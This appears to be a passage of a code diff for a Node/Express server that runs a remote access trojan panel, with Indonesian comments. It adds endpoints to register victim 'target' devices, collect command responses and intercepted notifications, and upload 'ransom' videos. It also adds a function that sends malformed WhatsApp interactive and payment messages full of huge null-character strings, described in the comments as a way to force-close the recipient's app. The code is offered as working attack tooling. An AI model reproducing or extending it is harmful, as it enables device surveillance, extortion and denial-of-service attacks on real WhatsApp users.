+  if (user.role === "owner" || user.role === "dev" || user.role === "pemilik") {
+    const owned = targets.filter(t =>
+      t.owner === user.username ||
+      (user.pairId && t.pairId && t.pairId.toUpperCase() === user.pairId.toUpperCase())
+    );
+    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
+  }
+
+  // Member/Reseller: cek approval dulu
+  const perms = loadDevicePerms();
+  const userPerm = perms[user.username.toLowerCase()];
+
+  let hasApproval = false;
+  if (userPerm && userPerm.approved) {
+    hasApproval = true;
+  } else {
+    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
+      const perm = owner.ratPerms?.[user.username];
+      if (perm && perm.approved) { hasApproval = true; break; }
     }
-    
-    res.json({ valid: true, pairId: user.pairId || null, role: user.role || 'member', devices: devices });
+  }
+
+  if (!hasApproval) {
+    return res.json({ valid: true, pairId: user.pairId || null, role: user.role, devices: [], approved: false });
+  }
+
+  const myDeviceIds = Array.isArray(user.devices) ? user.devices : [];
+  const myDevices = targets.filter(t => myDeviceIds.includes(t.id));
+  res.json({ valid: true, pairId: user.pairId || null, role: user.role, devices: myDevices, approved: true });
 });
 
+
 app.post('/api/register-target', (req, res) => {
-    const { id, model, battery, owner } = req.body;
+    const { id, model, battery, owner, pairId } = req.body;
     if (!id) return res.status(400).json({ error: 'id required' });
-    
+
+    // Cari owner dari pairId kalau owner tidak dikirim langsung
+    let resolvedOwner = owner || 'unknown';
+    if (pairId && resolvedOwner === 'unknown') {
+        const db = loadDatabase();
+        const ownerUser = db.find(u => u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase());
+        if (ownerUser) resolvedOwner = ownerUser.username;
+    }
+
     let targets = readRat(RAT_TARGETS);
     const existing = targets.findIndex(t => t.id === id);
     const newTarget = {
         id: id,
         model: model || 'Unknown',
         battery: battery || 0,
-        owner: owner || 'unknown',
+        owner: resolvedOwner,
+        pairId: pairId || null,
         status: 'Online',
         lastSeen: new Date().toISOString()
     };
-    
+
     if (existing !== -1) {
+        // Preserve owner kalau sudah ada
+        if (targets[existing].owner && targets[existing].owner !== 'unknown') {
+            newTarget.owner = targets[existing].owner;
+        }
         targets[existing] = { ...targets[existing], ...newTarget, status: 'Online', lastSeen: new Date().toISOString() };
     } else {
         targets.push(newTarget);
     }
-    
+
     saveRat(RAT_TARGETS, targets);
-    res.json({ status: 'ok' });
+    console.log(`[RAT] Device ${id} registered - owner: ${newTarget.owner}`);
+    res.json({ status: 'ok', owner: newTarget.owner });
 });
 
 app.post('/api/pair-target', (req, res) => {
@@ -3962,6 +4837,7 @@ app.post('/api/pair-target', (req, res) => {
         model: model || 'Unknown',
         battery: battery || 0,
         owner: owner.username,
+        pairId: pairId,
         status: 'Online',
         lastSeen: new Date().toISOString()
     };
@@ -4095,7 +4971,7 @@ app.delete('/api/lock-chat/:id', (req, res) => {
 app.get("/devicePerms", (req, res) => {
     const { key, username } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const perms = loadDevicePerms();
     const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
@@ -4105,7 +4981,7 @@ app.get("/devicePerms", (req, res) => {
 app.post("/setDevicePerm", (req, res) => {
     const { key } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const db = loadDatabase();
     const requester = db.find(u => u.username === keyInfo.username);
@@ -4130,7 +5006,7 @@ app.post("/setDevicePerm", (req, res) => {
 app.get("/listDevicePerms", (req, res) => {
     const { key } = req.query;
     const keyInfo = activeKeys[key];
-    if (!keyInfo) return res.status(401).json({ valid: false });
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
     
     const db = loadDatabase();
     const requester = db.find(u => u.username === keyInfo.username);
@@ -4291,7 +5167,7 @@ app.get("/getOnlineUsers", (req, res) => {
     const keyInfo = activeKeys[key];
     if (!keyInfo) return res.json({ valid: false });
     
-    const onlineUsers = loadOnlineUsers();
+    const onlineUsers = loadOnlineChatUsers();
     const activeNow = onlineUsers.filter(u => {
         const lastActive = new Date(u.lastActive);
         return (Date.now() - lastActive) < 60000;
@@ -4304,8 +5180,200 @@ app.get("/getOnlineUsers", (req, res) => {
     });
 });
 
+
+
+// ── Endpoints dari scvr yang dimerge ────────────────────────────────────────
+app.get('/api/list-targets', (req, res) => {
+  const { owner } = req.query;
+  const t = readRat(RAT_TARGETS);
+  res.json(owner ? t.filter(x => x.owner === owner) : t);
+});
+
+app.post('/api/upload-media', (req, res) => {
+  try {
+    const { file, ext, type } = req.body;
+    if (!file) return res.status(400).json({ error: 'No file data' });
+    const fname = Date.now() + '_media.' + (ext || 'bin');
+    const fpath = require('path').join(uploadDir, fname);
+    const buf = Buffer.from(file, 'base64');
+    require('fs').writeFileSync(fpath, buf);
+    const host = req.headers.host || 'localhost';
+    const url = `http://${host}/ransom_videos/${fname}`;
+    console.log('[UPLOAD] Saved:', fname, buf.length, 'bytes');
+    res.json({ status: 'ok', url });
+  } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/upload-ransom-video', (req, res) => {
+  try {
+    const { file, ext } = req.body;
+    if (!file) return res.status(400).json({ error: 'No file data' });
+    const fname = Date.now() + '_ransom.' + (ext || 'mp4');
+    const fpath = require('path').join(uploadDir, fname);
+    const buf = Buffer.from(file, 'base64');
+    require('fs').writeFileSync(fpath, buf);
+    const host = req.headers.host || 'localhost';
+    const url = `http://${host}/ransom_videos/${fname}`;
+    console.log('[RANSOM VIDEO] Saved:', fname, buf.length, 'bytes');
+    res.json({ status: 'ok', url });
+  } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+// Serve uploaded files secara publik
+app.post('/api/post-response/:id', (req, res) => {
+  const id = req.params.id;
+  const { cmd, data } = req.body;
+  let resps = readRat('./rat_responses.json');
+  const i = resps.findIndex(r => r.targetId === id);
+  const nr = { targetId: id, cmd, data, timestamp: new Date() };
+  if (i !== -1) resps[i] = nr; else resps.push(nr);
+  saveRat('./rat_responses.json', resps);
+  console.log('[RESP] ' + cmd + ' from ' + id);
+  res.json({ status: 'ok' });
+});
+
+app.get('/api/get-response/:id', (req, res) => {
+  const resps = readRat('./rat_responses.json');
+  res.json(resps.find(r => r.targetId === req.params.id) || {});
+});
+
+app.post('/api/post-notification/:id', (req, res) => {
+  let n = readRat('./rat_notifs.json');
+  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
+  if (n.length > 1000) n = n.slice(0, 1000);
+  saveRat('./rat_notifs.json', n);
+  res.json({ status: 'saved' });
+});
+
+app.get('/api/get-notifications/:id', (req, res) => {
+  const n = readRat('./rat_notifs.json');
+  res.json(n.filter(x => x.targetId === req.params.id));
+});
+
+// Init RAT files
+['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
+  const p = './' + f + '.json';
+  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
+});
+
+
+// ════════════════════════════════════════════════════════════════════════════
+// DELAY FC — Force Close WhatsApp via malformed interactive message
+// Teknik: corrupt nativeFlowMessage dengan payload yang tidak bisa di-parse WA
+async function delayAxRRG(sock, target) {
+  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
+  try {
+    // Method 1: Corrupt interactive native flow — bikin WA parser hang
+    const badFlow = generateWAMessageFromContent(jid, {
+      interactiveMessage: {
+        header: {
+          title: String.fromCharCode(0).repeat(500000),
+          hasMediaAttachment: false
+        },
+        body: {
+          text: String.fromCharCode(0).repeat(1000000)
+        },
+        footer: { text: "" },
+        nativeFlowMessage: {
+          buttons: Array.from({ length: 50000 }, (_, i) => ({
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: String.fromCharCode(0).repeat(50000) + i,
+              url: "https://wa.me/" + String.fromCharCode(0).repeat(10000),
+              merchant_url: "https://wa.me/" + String.fromCharCode(0).repeat(10000)
+            })
+          })),
+          messageParamsJson: JSON.stringify({
+            flow_token: String.fromCharCode(0).repeat(500000),
+            flow_id: String.fromCharCode(0).repeat(200000),
+            data: Object.fromEntries(
+              Array.from({ length: 10000 }, (_, i) => [
+                String.fromCharCode(0).repeat(1000) + i,
+                String.fromCharCode(0).repeat(5000)
+              ])
+            )
+          })
+        },
+        contextInfo: {
+          forwardingScore: 999999,
+          isForwarded: true,
+          mentionedJid: Array.from({ length: 5000 }, () =>
+            Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
+          ),
+          quotedMessage: {
+            conversation: String.fromCharCode(0).repeat(500000)
+          }
+        }
+      }
+    }, {});
+    await sock.relayMessage(jid, badFlow.message, { messageId: badFlow.key.id });
+
+    // Method 2: requestPayment dengan data corrupt
+    await sock.relayMessage(jid, {
+      requestPaymentMessage: {
+        currencyCodeIso4217: String.fromCharCode(0).repeat(100000),
+        amount1000: 999999999999,
+        requestFrom: jid,
+        noteMessage: {
+          extendedTextMessage: {
+            text: String.fromCharCode(0).repeat(2000000),
+            contextInfo: {
+              mentionedJid: Array.from({ length: 8000 }, () =>
+                Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
+              ),
+              forwardingScore: 999999999
+            }
+          }
+        },
+        expiryTimestamp: 99999999999999,
+        amount: { offset: 0, value: 999999999, currencyCode: "IDR" }
+      }
+    }, {});
+
+    console.log("[DELAY FC] Sent to " + jid);
+  } catch(e) {
+    console.warn("[DELAY FC] Error:", e.message);
+  }
+}
+
+
+// ── DEBUG: Lihat pairId semua user (akses dengan superkey) ───────────────────
+
+// ── CS Chat (merged from scvr) ────────────────────────────────────────────────
+const csChats = {};
+
+app.post('/api/cs-chat', (req, res) => {
+  try {
+    const { key, from, text, name } = req.body;
+    if (!key || !text) return res.status(400).json({ error: 'key & text required' });
+    if (!csChats[key]) csChats[key] = [];
+    const msg = { from: from || 'user', name: name || 'User', text,
+      time: new Date().toLocaleTimeString('id-ID', {hour:'2-digit',minute:'2-digit'}),
+      ts: Date.now() };
+    csChats[key].push(msg);
+    if (csChats[key].length > 100) csChats[key] = csChats[key].slice(-100);
+    if (from === 'user') {
+      try { bot.sendMessage(OWNER_ID,
+        `💬 *CS Chat*\n👤 ${name||'User'}\n📩 ${text}`, { parse_mode: 'Markdown' });
+      } catch(_) {}
+    }
+    res.json({ status: 'ok', msg });
+  } catch(e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/api/cs-chat', (req, res) => {
+  try {
+    const { key, since } = req.query;
+    if (!key) return res.status(400).json({ error: 'key required' });
+    const msgs = csChats[key] || [];
+    const filtered = since ? msgs.filter(m => m.ts > parseInt(since)) : msgs;
+    res.json({ messages: filtered });
+  } catch(e) { res.json({ messages: [] }); }
+});
+
+
 app.listen(PORT, async () => {
-  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
+  console.log(`🚀 Server aktif di http://beli-panel-dialxzy.alxzyy.my.id:${PORT}`);
   await startUserSessions();
   await connectGlobalSenders();
 });
